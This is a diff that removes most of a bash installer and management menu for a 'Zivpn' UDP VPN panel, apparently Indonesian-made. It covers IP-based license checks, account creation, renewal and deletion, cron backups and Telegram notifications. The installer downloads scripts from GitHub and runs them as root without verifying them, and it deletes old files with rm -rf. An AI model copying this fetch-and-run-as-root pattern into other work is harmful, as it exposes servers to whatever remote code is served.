@@ -1,1239 +1,761 @@
 #!/bin/bash
-# Zivpn UDP Module Manager
-# This script installs the base Zivpn service and then sets up an advanced management interface.
-
-# --- UI Definitions ---
-YELLOW='\033[1;33m'
-RED='\033[0;31m'
-BOLD_WHITE='\033[1;37m'
-CYAN='\033[0;36m'
-GREEN='\033[0;32m'
-LIGHT_GREEN='\033[1;32m'
-NC='\033[0m' # No Color
-
-# --- License Info ---
-LICENSE_URL="https://raw.githubusercontent.com/altunnel/regip/main/ip"
-LICENSE_INFO_FILE="/etc/zivpn/.license_info"
-
-# --- Pre-flight Checks ---
-if [ "$(id -u)" -ne 0 ]; then
-  echo "This script must be run as root. Please use sudo or run as root user." >&2
-  exit 1
-fi
-
-# --- License Verification Function ---
-function verify_license() {
-    echo "Verifying installation license..."
-    local SERVER_IP
-    SERVER_IP=$(curl -4 -s ifconfig.me)
-    if [ -z "$SERVER_IP" ]; then
-        echo -e "${RED}Failed to retrieve server IP. Please check your internet connection.${NC}"
-        exit 1
-    fi
-
-    local license_data
-    license_data=$(curl -s "$LICENSE_URL")
-    if [ $? -ne 0 ] || [ -z "$license_data" ]; then
-        echo -e "${RED}Gagal terhubung ke server lisensi. Mohon periksa koneksi internet Anda.${NC}"
-        exit 1
-    fi
-
-    local license_entry
-    license_entry=$(echo "$license_data" | grep -w "$SERVER_IP")
-
-    if [ -z "$license_entry" ]; then
-        echo -e "${RED}Verifikasi Lisensi Gagal! IP Anda tidak terdaftar. IP: ${SERVER_IP}${NC}"
-        exit 1
-    fi
-
-    local client_name
-    local expiry_date_str
-    client_name=$(echo "$license_entry" | awk '{print $1}')
-    expiry_date_str=$(echo "$license_entry" | awk '{print $2}')
-
-    local expiry_timestamp
-    expiry_timestamp=$(date -d "$expiry_date_str" +%s)
-    local current_timestamp
-    current_timestamp=$(date +%s)
-
-    if [ "$expiry_timestamp" -le "$current_timestamp" ]; then
-        echo -e "${RED}Verifikasi Lisensi Gagal! Lisensi untuk IP ${SERVER_IP} telah kedaluwarsa. Tanggal Kedaluwarsa: ${expiry_date_str}${NC}"
-        exit 1
-    fi
-    
-    echo -e "${LIGHT_GREEN}Verifikasi Lisensi Berhasil! Client: ${client_name}, IP: ${SERVER_IP}${NC}"
-    sleep 2 # Brief pause to show the message
-    
-    mkdir -p /etc/zivpn
-    echo "CLIENT_NAME=${client_name}" > "$LICENSE_INFO_FILE"
-    echo "EXPIRY_DATE=${expiry_date_str}" >> "$LICENSE_INFO_FILE"
-}
-
-# --- Utility Functions ---
-function restart_zivpn() {
-    echo "Restarting ZIVPN service..."
-    systemctl restart zivpn.service
-    echo "Service restarted."
-}
-
-# --- Internal Logic Functions (for API calls) ---
-function _create_account_logic() {
-    local password="$1"
-    local days="$2"
-    local db_file="/etc/zivpn/users.db"
-
-    if [ -z "$password" ] || [ -z "$days" ]; then
-        echo "Error: Password and days are required."
-        return 1
-    fi
-    
-    if ! [[ "$days" =~ ^[0-9]+$ ]]; then
-        echo "Error: Invalid number of days."
-        return 1
-    fi
-
-    if grep -q "^${password}:" "$db_file"; then
-        echo "Error: Password '${password}' already exists."
-        return 1
-    fi
-
-    local expiry_date
-    expiry_date=$(date -d "+$days days" +%s)
-    echo "${password}:${expiry_date}" >> "$db_file"
-    
-    # Use a temporary file for atomic write
-    jq --arg pass "$password" '.auth.config += [$pass]' /etc/zivpn/config.json > /etc/zivpn/config.json.tmp && mv /etc/zivpn/config.json.tmp /etc/zivpn/config.json
-    
-    if [ $? -eq 0 ]; then
-        echo "Success: Account '${password}' created, expires in ${days} days."
-        restart_zivpn
-        return 0
-    else
-        # Rollback the change in users.db if config update fails
-        sed -i "/^${password}:/d" "$db_file"
-        echo "Error: Failed to update config.json."
-        return 1
-    fi
-}
-
-# --- Core Logic Functions ---
-function create_manual_account() {
-    echo "--- Create New Zivpn Account ---"
-    read -p "Enter new password: " password
-    if [ -z "$password" ]; then
-        echo "Password cannot be empty."
-        return
-    fi
-
-    read -p "Enter active period (in days): " days
-    if ! [[ "$days" =~ ^[0-9]+$ ]]; then
-        echo "Invalid number of days."
-        return
-    fi
-
-    # Call the logic function and capture its output
-    local result
-    result=$(_create_account_logic "$password" "$days")
-    
-    # Display logic remains here for interactive mode if successful
-    if [[ "$result" == "Success"* ]]; then
-        local db_file="/etc/zivpn/users.db"
-        local user_line
-        user_line=$(grep "^${password}:" "$db_file")
-        if [ -n "$user_line" ]; then
-            local expiry_date
-            expiry_date=$(echo "$user_line" | cut -d: -f2)
-
-            local CERT_CN
-            CERT_CN=$(openssl x509 -in /etc/zivpn/zivpn.crt -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p')
-            local HOST
-            if [ "$CERT_CN" == "zivpn" ]; then
-                HOST=$(curl -4 -s ifconfig.me)
-            else
-                HOST=$CERT_CN
-            fi
-
-            local EXPIRE_FORMATTED
-            EXPIRE_FORMATTED=$(date -d "@$expiry_date" +"%d %B %Y")
-            
-            clear
-            echo "🔹Informasi Akun zivpn Anda🔹"
-            echo "┌─────────────────────"
-            echo "│ Host: $HOST"
-            echo "│ Pass: $password"
-            echo "│ Expire: $EXPIRE_FORMATTED"
-            echo "└─────────────────────"
-            echo "♨ᵗᵉʳⁱᵐᵃᵏᵃˢⁱʰ ᵗᵉˡᵃʰ ᵐᵉⁿᵍᵍᵘⁿᵃᵏᵃⁿ ˡᵃʸᵃⁿᵃⁿ ᵏᵃᵐⁱ♨"
-        fi
-    else
-        # If it failed, show the error message
-        echo "$result"
-    fi
-    
-    read -p "Tekan Enter untuk kembali ke menu..."
-}
-
-function _generate_api_key() {
-    clear
-    echo "--- Generate API Authentication Key ---"
-    
-    # Generate a 6-character alphanumeric key
-    local api_key
-    api_key=$(LC_ALL=C tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 6)
-    
-    local key_file="/etc/zivpn/api_auth.key"
-    
-    echo "$api_key" > "$key_file"
-    chmod 600 "$key_file"
-    
-    echo "New API authentication key has been generated and saved."
-    echo "Key: ${api_key}"
-    
-    echo "Sending API key to Telegram..."
-    # Get Server IP and Domain for the notification
-    local server_ip
-    server_ip=$(curl -4 -s ifconfig.me)
-    local cert_cn
-    cert_cn=$(openssl x509 -in /etc/zivpn/zivpn.crt -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p' 2>/dev/null || echo "")
-    local domain
-    if [ "$cert_cn" == "zivpn" ] || [ -z "$cert_cn" ]; then
-        domain=$server_ip
-    else
-        domain=$cert_cn
-    fi
-    
-    /usr/local/bin/zivpn_helper.sh api-key-notification "$api_key" "$server_ip" "$domain"
-    
-    read -p "Tekan Enter untuk kembali ke menu..."
-}
-
-function _create_trial_account_logic() {
-    local minutes="$1"
-    local db_file="/etc/zivpn/users.db"
-
-    if ! [[ "$minutes" =~ ^[0-9]+$ ]]; then
-        echo "Error: Invalid number of minutes."
-        return 1
-    fi
-
-    local password="trial$(shuf -i 10000-99999 -n 1)"
-
-    local expiry_date
-    expiry_date=$(date -d "+$minutes minutes" +%s)
-    echo "${password}:${expiry_date}" >> "$db_file"
-    
-    jq --arg pass "$password" '.auth.config += [$pass]' /etc/zivpn/config.json > /etc/zivpn/config.json.tmp && mv /etc/zivpn/config.json.tmp /etc/zivpn/config.json
-    
-    if [ $? -eq 0 ]; then
-        echo "Success: Trial account '${password}' created, expires in ${minutes} minutes."
-        restart_zivpn
-        return 0
-    else
-        sed -i "/^${password}:/d" "$db_file"
-        echo "Error: Failed to update config.json."
-        return 1
-    fi
-}
-
-function create_trial_account() {
-    echo "--- Create Trial Zivpn Account ---"
-    read -p "Enter active period (in minutes): " minutes
-    if ! [[ "$minutes" =~ ^[0-9]+$ ]]; then
-        echo "Invalid number of minutes."
-        return
-    fi
-
-    local result
-    result=$(_create_trial_account_logic "$minutes")
-    
-    if [[ "$result" == "Success"* ]]; then
-        # Extract password from the success message
-        local password
-        password=$(echo "$result" | sed -n "s/Success: Trial account '\([^']*\)'.*/\1/p")
-        
-        local db_file="/etc/zivpn/users.db"
-        local user_line
-        user_line=$(grep "^${password}:" "$db_file")
-        if [ -n "$user_line" ]; then
-            local expiry_date
-            expiry_date=$(echo "$user_line" | cut -d: -f2)
-
-            local CERT_CN
-            CERT_CN=$(openssl x509 -in /etc/zivpn/zivpn.crt -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p')
-            local HOST
-            if [ "$CERT_CN" == "zivpn" ]; then
-                HOST=$(curl -4 -s ifconfig.me)
-            else
-                HOST=$CERT_CN
-            fi
-
-            local EXPIRE_FORMATTED
-            EXPIRE_FORMATTED=$(date -d "@$expiry_date" +"%d %B %Y %H:%M:%S")
-            
-            clear
-            echo "🔹Informasi Akun zivpn Anda🔹"
-            echo "┌─────────────────────"
-            echo "│ Host: $HOST"
-            echo "│ Pass: $password"
-            echo "│ Expire: $EXPIRE_FORMATTED"
-            echo "└─────────────────────"
-            echo "♨ᵗᵉʳⁱᵐᵃᵏᵃˢⁱʰ ᵗᵉˡᵃʰ ᵐᵉⁿᵍᵍᵘⁿᵃᵏᵃⁿ ˡᵃʸᵃⁿᵃⁿ ᵏᵃᵐⁱ♨"
-        fi
-    else
-        echo "$result"
-    fi
-    
-    read -p "Tekan Enter untuk kembali ke menu..."
-}
-
-function _renew_account_logic() {
-    local password="$1"
-    local days="$2"
-    local db_file="/etc/zivpn/users.db"
-
-    if [ -z "$password" ] || [ -z "$days" ]; then
-        echo "Error: Password and days are required."
-        return 1
-    fi
-    
-    if ! [[ "$days" =~ ^[1-9][0-9]*$ ]]; then
-        echo "Error: Invalid number of days."
-        return 1
-    fi
-
-    local user_line
-    user_line=$(grep "^${password}:" "$db_file")
-
-    if [ -z "$user_line" ]; then
-        echo "Error: Account '${password}' not found."
-        return 1
-    fi
-
-    local current_expiry_date
-    current_expiry_date=$(echo "$user_line" | cut -d: -f2)
-
-    if ! [[ "$current_expiry_date" =~ ^[0-9]+$ ]]; then
-        echo "Error: Corrupted database entry for user '$password'."
-        return 1
-    fi
-    
-    local seconds_to_add=$((days * 86400))
-    local new_expiry_date=$((current_expiry_date + seconds_to_add))
-    
-    sed -i "s/^${password}:.*/${password}:${new_expiry_date}/" "$db_file"
-    echo "Success: Account '${password}' has been renewed for ${days} days."
-    return 0
-}
-
-function renew_account() {
-    clear
-    echo "--- Renew Account ---"
-    _display_accounts
-    echo "" # Add a newline for better spacing
-    read -p "Enter password to renew: " password
-    if [ -z "$password" ]; then
-        echo "Password cannot be empty."
-        return
-    fi
-
-    read -p "Enter number of days to extend: " days
-    if ! [[ "$days" =~ ^[1-9][0-9]*$ ]]; then
-        echo "Invalid number of days. Please enter a positive number."
-        return
-    fi
-
-    local result
-    result=$(_renew_account_logic "$password" "$days")
-    
-    if [[ "$result" == "Success"* ]]; then
-        local db_file="/etc/zivpn/users.db"
-        local user_line
-        user_line=$(grep "^${password}:" "$db_file")
-        local new_expiry_date
-        new_expiry_date=$(echo "$user_line" | cut -d: -f2)
-        local new_expiry_formatted
-        new_expiry_formatted=$(date -d "@$new_expiry_date" +"%d %B %Y")
-        echo "Account '${password}' has been renewed. New expiry date: ${new_expiry_formatted}."
-    else
-        echo "$result"
-    fi
-    read -p "Tekan Enter untuk kembali ke menu..."
-}
-
-function _delete_account_logic() {
-    local password="$1"
-    local db_file="/etc/zivpn/users.db"
-    local config_file="/etc/zivpn/config.json"
-    local tmp_config_file="${config_file}.tmp"
-
-    if [ -z "$password" ]; then
-        echo "Error: Password is required."
-        return 1
-    fi
-
-    if [ ! -f "$db_file" ] || ! grep -q "^${password}:" "$db_file"; then
-        echo "Error: Password '${password}' not found."
-        return 1
-    fi
-
-    # Step 1: Try to update the config file first to a temporary location
-    jq --arg pass "$password" 'del(.auth.config[] | select(. == $pass))' "$config_file" > "$tmp_config_file"
-    
-    if [ $? -eq 0 ]; then
-        # Step 2: If config update is successful, remove user from db
-        sed -i "/^${password}:/d" "$db_file"
-        
-        # Step 3: Atomically replace the old config with the new one
-        mv "$tmp_config_file" "$config_file"
-        
-        echo "Success: Account '${password}' deleted."
-        restart_zivpn
-        return 0
-    else
-        # If config update fails, do not touch the db file and report error
-        rm -f "$tmp_config_file" # Clean up temp file
-        echo "Error: Failed to update config.json. No changes were made."
-        return 1
-    fi
-}
-
-function delete_account() {
-    clear
-    echo "--- Delete Account ---"
-    _display_accounts
-    echo "" # Add a newline for better spacing
-    read -p "Enter password to delete: " password
-    if [ -z "$password" ]; then
-        echo "Password cannot be empty."
-        return
-    fi
-
-    local result
-    result=$(_delete_account_logic "$password")
-    
-    echo "$result" # Display the result from the logic function
-    read -p "Tekan Enter untuk kembali ke menu..."
-}
-
-function change_domain() {
-    echo "--- Change Domain ---"
-    read -p "Enter the new domain name for the SSL certificate: " domain
-    if [ -z "$domain" ]; then
-        echo "Domain name cannot be empty."
-        return
-    fi
-
-    echo "Generating new certificate for domain '${domain}'..."
-    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
-        -subj "/C=US/ST=California/L=Los Angeles/O=Example Corp/OU=IT Department/CN=${domain}" \
-        -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt"
-
-    echo "New certificate generated."
-    restart_zivpn
-}
-
-function _display_accounts() {
-    local db_file="/etc/zivpn/users.db"
-
-    if [ ! -f "$db_file" ] || [ ! -s "$db_file" ]; then
-        echo "No accounts found."
-        return
-    fi
-
-    local current_date
-    current_date=$(date +%s)
-    printf "%-20s | %s\n" "Password" "Expires in (days)"
-    echo "------------------------------------------"
-    while IFS=':' read -r password expiry_date; do
-        if [[ -n "$password" ]]; then
-            local remaining_seconds=$((expiry_date - current_date))
-            if [ $remaining_seconds -gt 0 ]; then
-                local remaining_days=$((remaining_seconds / 86400))
-                printf "%-20s | %s days\n" "$password" "$remaining_days"
-            else
-                printf "%-20s | Expired\n" "$password"
-            fi
-        fi
-    done < "$db_file"
-    echo "------------------------------------------"
-}
-
-function list_accounts() {
-    clear
-    echo "--- Active Accounts ---"
-    _display_accounts
-    echo "" # Add a newline for better spacing
-    read -p "Press Enter to return to the menu..."
-}
-
-function format_kib_to_human() {
-    local kib=$1
-    if ! [[ "$kib" =~ ^[0-9]+$ ]] || [ -z "$kib" ]; then
-        kib=0
-    fi
-    
-    # Using awk for floating point math
-    if [ "$kib" -lt 1048576 ]; then
-        awk -v val="$kib" 'BEGIN { printf "%.2f MiB", val / 1024 }'
-    else
-        awk -v val="$kib" 'BEGIN { printf "%.2f GiB", val / 1048576 }'
-    fi
-}
-
-function get_main_interface() {
-    # Find the default network interface using the IP route. This is the most reliable method.
-    ip -o -4 route show to default | awk '{print $5}' | head -n 1
-}
-
-function _draw_info_panel() {
-    # --- Fetch Data ---
-    local os_info isp_info ip_info host_info bw_today bw_month client_name license_exp
-
-    os_info=$( (hostnamectl 2>/dev/null | grep "Operating System" | cut -d: -f2 | sed 's/^[ \t]*//') || echo "N/A" )
-    os_info=${os_info:-"N/A"}
-
-    local ip_data
-    ip_data=$(curl -s ipinfo.io)
-    ip_info=$(echo "$ip_data" | jq -r '.ip // "N/A"')
-    isp_info=$(echo "$ip_data" | jq -r '.org // "N/A"')
-    ip_info=${ip_info:-"N/A"}
-    isp_info=${isp_info:-"N/A"}
-
-    local CERT_CN
-    CERT_CN=$(openssl x509 -in /etc/zivpn/zivpn.crt -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p' 2>/dev/null || echo "")
-    if [ "$CERT_CN" == "zivpn" ] || [ -z "$CERT_CN" ]; then
-        host_info=$ip_info
-    else
-        host_info=$CERT_CN
-    fi
-    host_info=${host_info:-"N/A"}
-
-    if command -v vnstat &> /dev/null; then
-        local iface
-        iface=$(get_main_interface)
-        local current_year current_month current_day
-        current_year=$(date +%Y)
-        current_month=$(date +%-m) # Use %-m to avoid leading zero
-        current_day=$(date +%-d) # Use %-d to avoid leading zero for days < 10
-
-        # Daily
-        local today_total_kib=0
-        local vnstat_daily_json
-        vnstat_daily_json=$(vnstat --json d 2>/dev/null)
-        if [[ -n "$vnstat_daily_json" && "$vnstat_daily_json" == "{"* ]]; then
-            today_total_kib=$(echo "$vnstat_daily_json" | jq --arg iface "$iface" --argjson year "$current_year" --argjson month "$current_month" --argjson day "$current_day" '((.interfaces[] | select(.name == $iface) | .traffic.days // [])[] | select(.date.year == $year and .date.month == $month and .date.day == $day) | .total) // 0' | head -n 1)
-        fi
-        today_total_kib=${today_total_kib:-0}
-        bw_today=$(format_kib_to_human "$today_total_kib")
-
-        # Monthly
-        local month_total_kib=0
-        local vnstat_monthly_json
-        vnstat_monthly_json=$(vnstat --json m 2>/dev/null)
-        if [[ -n "$vnstat_monthly_json" && "$vnstat_monthly_json" == "{"* ]]; then
-            month_total_kib=$(echo "$vnstat_monthly_json" | jq --arg iface "$iface" --argjson year "$current_year" --argjson month "$current_month" '((.interfaces[] | select(.name == $iface) | .traffic.months // [])[] | select(.date.year == $year and .date.month == $month) | .total) // 0' | head -n 1)
-        fi
-        month_total_kib=${month_total_kib:-0}
-        bw_month=$(format_kib_to_human "$month_total_kib")
-
-    else
-        bw_today="N/A"
-        bw_month="N/A"
-    fi
-
-    # --- License Info ---
-    if [ -f "$LICENSE_INFO_FILE" ]; then
-        source "$LICENSE_INFO_FILE" # Loads CLIENT_NAME and EXPIRY_DATE
-        client_name=${CLIENT_NAME:-"N/A"}
-        
-        if [ -n "$EXPIRY_DATE" ]; then
-            local expiry_timestamp
-            expiry_timestamp=$(date -d "$EXPIRY_DATE" +%s)
-            local current_timestamp
-            current_timestamp=$(date +%s)
-            local remaining_seconds=$((expiry_timestamp - current_timestamp))
-            if [ $remaining_seconds -gt 0 ]; then
-                license_exp="$((remaining_seconds / 86400)) days"
-            else
-                license_exp="Expired"
-            fi
-        else
-            license_exp="N/A"
-        fi
-    else
-        client_name="N/A"
-        license_exp="N/A"
-    fi
-
-    # --- Print Panel ---
-    printf "  ${RED}%-7s${BOLD_WHITE}%-18s ${RED}%-6s${BOLD_WHITE}%-19s${NC}\n" "OS:" "${os_info}" "ISP:" "${isp_info}"
-    printf "  ${RED}%-7s${BOLD_WHITE}%-18s ${RED}%-6s${BOLD_WHITE}%-19s${NC}\n" "IP:" "${ip_info}" "Host:" "${host_info}"
-    printf "  ${RED}%-7s${BOLD_WHITE}%-18s ${RED}%-6s${BOLD_WHITE}%-19s${NC}\n" "Client:" "${client_name}" "EXP:" "${license_exp}"
-    printf "  ${RED}%-7s${BOLD_WHITE}%-18s ${RED}%-6s${BOLD_WHITE}%-19s${NC}\n" "Today:" "${bw_today}" "Month:" "${bw_month}"
-}
-
-function _draw_service_status() {
-    local status_text status_color status_output
-    local service_status
-    service_status=$(systemctl is-active zivpn.service 2>/dev/null)
-
-    if [ "$service_status" = "active" ]; then
-        status_text="Running"
-        status_color="${LIGHT_GREEN}"
-    elif [ "$service_status" = "inactive" ]; then
-        status_text="Stopped"
-        status_color="${RED}"
-    elif [ "$service_status" = "failed" ]; then
-        status_text="Error"
-        status_color="${RED}"
-    else
-        status_text="Unknown"
-        status_color="${RED}"
-    fi
-
-    status_output="${CYAN}Service: ${status_color}${status_text}${NC}"
-    
-    # Center the text
-    local menu_width=55  # Total width of the menu box including borders
-    local text_len_visible
-    text_len_visible=$(echo -e "$status_output" | sed 's/\x1b\[[0-9;]*m//g' | wc -c)
-    text_len_visible=$((text_len_visible - 1))
-
-    local padding_total=$((menu_width - text_len_visible))
-    local padding_left=$((padding_total / 2))
-    local padding_right=$((padding_total - padding_left))
-    
-    echo -e "${YELLOW}╠════════════════════════════════════════════════════╣${NC}"
-    echo -e "$(printf '%*s' $padding_left)${status_output}$(printf '%*s' $padding_right)"
-    echo -e "${YELLOW}╠════════════════════════════════════════════════════╣${NC}"
-}
-
-function setup_auto_backup() {
-    echo "--- Configure Auto Backup ---"
-    if [ ! -f "/etc/zivpn/telegram.conf" ]; then
-        echo "Telegram is not configured. Please run a manual backup once to set it up."
-        return
-    fi
-
-    read -p "Enter backup interval in hours (e.g., 6, 12, 24). Enter 0 to disable: " interval
-    if ! [[ "$interval" =~ ^[0-9]+$ ]]; then
-        echo "Invalid input. Please enter a number."
-        return
-    fi
-
-    (crontab -l 2>/dev/null | grep -v "# zivpn-auto-backup") | crontab -
-
-    if [ "$interval" -gt 0 ]; then
-        local cron_schedule="0 */${interval} * * *"
-        (crontab -l 2>/dev/null; echo "${cron_schedule} /usr/local/bin/zivpn_helper.sh backup >/dev/null 2>&1 # zivpn-auto-backup") | crontab -
-        echo "Auto backup scheduled to run every ${interval} hour(s)."
-    else
-        echo "Auto backup has been disabled."
-    fi
-}
-
-function create_account() {
-    clear
-    echo -e "${YELLOW}╔════════════════// ${RED}Create Account${YELLOW} //════════════════╗${NC}"
-    echo -e "${YELLOW}║                                                    ║${NC}"
-    echo -e "${YELLOW}║   ${RED}1)${NC} ${BOLD_WHITE}Create Zivpn                                  ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}2)${NC} ${BOLD_WHITE}Trial Zivpn                                   ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}0)${NC} ${BOLD_WHITE}Back to Main Menu                             ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║                                                    ║${NC}"
-    echo -e "${YELLOW}╚════════════════════════════════════════════════════╝${NC}"
-    
-    read -p "Enter your choice [0-2]: " choice
-
-    case $choice in
-        1) create_manual_account ;;
-        2) create_trial_account ;;
-        0) return ;;
-        *) echo "Invalid option." ;;
-    esac
-}
-
-function show_backup_menu() {
-    clear
-    echo -e "${YELLOW}╔═══════════════// ${RED}Backup/Restore${YELLOW} //═══════════════╗${NC}"
-    echo -e "${YELLOW}║                                                  ║${NC}"
-    echo -e "${YELLOW}║   ${RED}1)${NC} ${BOLD_WHITE}Backup Data                                 ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}2)${NC} ${BOLD_WHITE}Restore Data                                ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}3)${NC} ${BOLD_WHITE}Auto Backup                                 ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}4)${NC} ${BOLD_WHITE}Atur Ulang Notifikasi Telegram              ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}0)${NC} ${BOLD_WHITE}Back to Main Menu                           ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║                                                  ║${NC}"
-    echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
-    
-    read -p "Enter your choice [0-4]: " choice
-    
-    case $choice in
-        1) /usr/local/bin/zivpn_helper.sh backup ;;
-        2) /usr/local/bin/zivpn_helper.sh restore ;;
-        3) setup_auto_backup ;;
-        4) /usr/local/bin/zivpn_helper.sh setup-telegram ;;
-        0) return ;;
-        *) echo "Invalid option." ;;
-    esac
-}
-
-function show_expired_message_and_exit() {
-    clear
-    echo -e "\n${RED}=====================================================${NC}"
-    echo -e "${RED}           LISENSI ANDA TELAH KEDALUWARSA!           ${NC}"
-    echo -e "${RED}=====================================================${NC}\n"
-    echo -e "${BOLD_WHITE}Akses ke layanan ZIVPN di server anda telah dihentikan."
-    echo -e "Segala aktivitas VPN tidak akan berfungsi lagi.\n"
-    echo -e "Untuk memperpanjang lisensi dan mengaktifkan kembali layanan,"
-    echo -e "silakan hubungi admin https://wa.me/6287792681887 \n"
-    echo -e "${LIGHT_GREEN}Setelah diperpanjang, layanan akan aktif kembali secara otomatis.${NC}\n"
-    exit 0
-}
-
-function show_menu() {
-    if [ -f "/etc/zivpn/.expired" ]; then
-        show_expired_message_and_exit
-    fi
-
-    clear
-    figlet "UDP ZIVPN" | lolcat
-    
-    echo -e "${YELLOW}╔═══════════// ${CYAN}AGUNG TUNNELING${YELLOW} //═════════════╗${NC}"
-    _draw_info_panel
-    _draw_service_status
-    echo -e "${YELLOW}║                                                    ║${NC}"
-    echo -e "${YELLOW}║   ${RED}1)${NC} ${BOLD_WHITE}Create Account                                ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}2)${NC} ${BOLD_WHITE}Renew Account                                 ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}3)${NC} ${BOLD_WHITE}Delete Account                                ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}4)${NC} ${BOLD_WHITE}Change Domain                                 ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}5)${NC} ${BOLD_WHITE}List Accounts                                 ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}6)${NC} ${BOLD_WHITE}Backup/Restore                                ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}7)${NC} ${BOLD_WHITE}Generate API Auth Key                         ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║   ${RED}0)${NC} ${BOLD_WHITE}Exit                                          ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║                                                    ║${NC}"
-    echo -e "${YELLOW}╚════════════════════════════════════════════════════╝${NC}"
-    
-    read -p "Enter your choice [0-7]: " choice
-
-    case $choice in
-        1) create_account ;;
-        2) renew_account ;;
-        3) delete_account ;;
-        4) change_domain ;;
-        5) list_accounts ;;
-        6) show_backup_menu ;;
-        7) _generate_api_key ;;
-        0) exit 0 ;;
-        *) echo "Invalid option. Please try again." ;;
-    esac
-}
-
-# --- Main Installation and Setup Logic ---
-function run_setup() {
-verify_license # <-- VERIFY LICENSE HERE
-# ==============================
-# ZiVPN Old Remover
-# ==============================
-
-echo -e "Uninstalling ZiVPN Old..."
-
-# Stop & disable services jika ada
-for svc in zivpn.service zivpn_backfill.service; do
-  if systemctl list-units --full -all | grep -Fq "$svc"; then
-    systemctl stop $svc 1>/dev/null 2>/dev/null
-    systemctl disable $svc 1>/dev/null 2>/dev/null
-    rm -f /etc/systemd/system/$svc 1>/dev/null 2>/dev/null
-    echo "Removed service $svc"
-  fi
-done
-
-# Kill process jika masih jalan
-if pgrep "zivpn" >/dev/null; then
-  killall zivpn 1>/dev/null 2>/dev/null
-  echo "Killed running zivpn processes"
-fi
-
-# Hapus file/folder jika ada
-[ -d /etc/zivpn ] && rm -rf /etc/zivpn
-[ -f /usr/local/bin/zivpn ] && rm -f /usr/local/bin/zivpn
-
-# Check hasil uninstall
-if ! pgrep "zivpn" >/dev/null; then
-  echo "Server Stopped"
-else
-  echo "Server Still Running"
-fi
-
-if [ ! -f /usr/local/bin/zivpn ]; then
-  echo "Files successfully removed"
-else
-  echo "Some files remain, try again"
-fi
-
-# Bersihkan cache saja
-echo "Cleaning Cache"
-echo 3 > /proc/sys/vm/drop_caches
-sysctl -w vm.drop_caches=3
-
-echo -e "Done."
-# ==============================
-# Quick Install ZiVPN Ubuntu 20.04
-# ==============================
-
-echo "1. Update OS dan install dependensi..."
-apt update && apt upgrade -y
-apt install wget curl ca-certificates -y
-update-ca-certificates
-
-echo "2. Hentikan service lama (jika ada)..."
-systemctl stop zivpn 2>/dev/null
-
-echo "3. Hapus binary lama (jika ada)..."
-rm -f /usr/local/bin/zivpn
-
-echo "4. Download skrip resmi ZiVPN..."
-wget -O /root/zi.sh https://raw.githubusercontent.com/zahidbd2/udp-zivpn/main/zi.sh
-
-echo "5. Beri izin executable..."
-chmod +x /root/zi.sh
-
-echo "6. Jalankan skrip instalasi ZiVPN..."
-sudo /root/zi.sh
-
-echo "7. Reload systemd dan start service..."
-systemctl daemon-reload
-systemctl start zivpn
-systemctl enable zivpn
-
-echo "8. Cek status service..."
-systemctl status zivpn --no-pager
-
-echo "✅ Instalasi selesai. Service ZiVPN harusnya aktif dan panel bisa mendeteksi."
-
-    # --- Setting up Advanced Management ---
-    echo "--- Setting up Advanced Management ---"
-
-    if ! command -v jq &> /dev/null || ! command -v curl &> /dev/null || ! command -v zip &> /dev/null || ! command -v figlet &> /dev/null || ! command -v lolcat &> /dev/null || ! command -v vnstat &> /dev/null; then
-        echo "Installing dependencies (jq, curl, zip, figlet, lolcat, vnstat)..."
-        apt-get update && apt-get install -y jq curl zip figlet lolcat vnstat
-    fi
-
-    # --- vnstat setup ---
-    echo "Configuring vnstat for bandwidth monitoring..."
-    local net_interface
-    net_interface=$(ip -o -4 route show to default | awk '{print $5}' | head -n 1)
-    if [ -n "$net_interface" ]; then
-        echo "Detected network interface: $net_interface"
-        # Wait for the service to be available after installation
-        sleep 2
-        systemctl stop vnstat
-        vnstat -u -i "$net_interface" --force
-        systemctl enable vnstat
-        systemctl start vnstat
-        echo "vnstat setup complete for interface $net_interface."
-    else
-        echo "Warning: Could not automatically detect network interface for vnstat."
-    fi
-    
-    # Download helper script from repository
-    echo "Downloading helper script..."
-    wget -O /usr/local/bin/zivpn_helper.sh https://raw.githubusercontent.com/altunnel/udp-zivpn/main/zivpn_helper.sh
-    if [ $? -ne 0 ]; then
-        echo "Failed to download helper script. Aborting."
-        exit 1
-    fi
-    chmod +x /usr/local/bin/zivpn_helper.sh
-
-    echo "Clearing initial password(s) set during base installation..."
-    jq '.auth.config = []' /etc/zivpn/config.json > /etc/zivpn/config.json.tmp && mv /etc/zivpn/config.json.tmp /etc/zivpn/config.json
-
-    touch /etc/zivpn/users.db
-
-    RANDOM_PASS="zivpn$(shuf -i 10000-99999 -n 1)"
-    EXPIRY_DATE=$(date -d "+1 day" +%s)
-
-    echo "Creating a temporary initial account..."
-    echo "${RANDOM_PASS}:${EXPIRY_DATE}" >> /etc/zivpn/users.db
-    jq --arg pass "$RANDOM_PASS" '.auth.config += [$pass]' /etc/zivpn/config.json > /etc/zivpn/config.json.tmp && mv /etc/zivpn/config.json.tmp /etc/zivpn/config.json
-
-    echo "Setting up expiry check cron job..."
-    cat <<'EOF' > /etc/zivpn/expire_check.sh
-#!/bin/bash
-DB_FILE="/etc/zivpn/users.db"
